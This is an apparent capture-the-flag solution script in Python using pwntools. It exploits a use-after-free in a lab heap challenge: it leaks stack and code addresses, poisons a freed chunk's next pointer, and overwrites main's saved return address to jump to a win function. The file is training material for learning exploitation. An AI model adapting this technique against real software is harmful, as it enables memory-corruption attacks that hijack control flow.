#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '10.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main+1424''') # b *main+964 main+484 breaking every malloc
    run_exploit(p, False)

def run_commands_list(commands, p, print_command):
    for command in commands:
        if print_command and not get_flag:
            print('COMMAND: ', command)
            input("")
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    try:
        p.sendline(line_to_send)
        if get_flag:
            print(p.recvrepeat(1).decode())
        else:
            print(p.recvrepeat(0.2).decode())
    except:
        print('Exception in \'print_send_print\'')
        pass

def get_address(output, start_of_address):
    address_start = output.find(start_of_address)
    address_ends = output.find('.', address_start)
    address = output[address_start:address_ends]
    #print('Address found: ', address)
    return int(address, 16)
    #return int('0x427f0a', 16)

def get_secret_from_output(output):
    print(output)
    start_search_string = 'Data: '
    secret_start = output.find(start_search_string) + len(start_search_string)
    secret_ends = output.find('\n', secret_start)
    return output[secret_start:secret_ends]

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)
        
    # exploit a use after free to overwrite the 'NEXT' key of a chunk
    # to point the chunk to a stack address with the return function
    # pointer of main

    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)
    stack_leak_address = get_address(welcome_message, '0x7')
    main_leak_address = get_address(welcome_message, '0x5')

    # bypass pie with the main leak
    win_address = main_leak_address - 0xfd
    # bypass ASLR with the stack leak
    # get the ret address of main with the "retaddr" command from pwndbg
    # subtract the difference betwen the ret address in the stack and the leaked stack address
    stack_saved_ret_pointer = stack_leak_address + 0x118

    print('Stack leak: ', hex(stack_leak_address))
    print('Main leak: ', hex(main_leak_address))
    print('Win address', hex(win_address))
    print('Stack saved address', hex(stack_saved_ret_pointer))
    input("")

    # We overwrite the saved return address of main (previously pointing to _libc_blabla)
    # with the address of WIN.
    # When main finish, will ret to win and print the flag
    commands = [
                b'malloc 0 100',
                b'malloc 1 100',
                b'free 1',
                b'free 0',
                # corrupting the chunk '1' with the stack ret pointer by scanfing to the chunk '0' after he was freed
                b'scanf 0 ' + p64(stack_saved_ret_pointer) + b'ZZZZZZZZ' + b'BBBBBBBB',
                b'malloc 0 100', 
                b'malloc 0 100',
                # overwriting the ret of main with win_address
                b'scanf 0 ' + p64(win_address),
                b'quit'
                ]

    run_commands_list(commands, p, True)
    p.close()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
